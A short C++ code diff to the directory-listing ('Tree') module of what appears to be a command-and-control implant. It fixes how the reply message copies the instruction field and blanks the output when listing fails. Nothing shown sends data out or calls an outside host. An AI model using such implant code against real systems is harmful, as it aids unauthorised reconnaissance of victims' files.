@@ -94,10 +94,10 @@ int Tree::process(C2Message &c2Message, C2Message &c2RetMessage)
     std::string outCmd;
     const bool listed = iterProcess(path, 0, outCmd);
 
-    c2RetMessage.set_instruction(c2RetMessage.instruction());
+    c2RetMessage.set_instruction(c2Message.instruction());
     c2RetMessage.set_cmd(path);
     c2RetMessage.set_errorCode(listed ? 0 : ERROR_TREE_DIRECTORY);
-    c2RetMessage.set_returnvalue(outCmd);
+    c2RetMessage.set_returnvalue(listed ? outCmd : std::string{});
 
     return 0;
 }
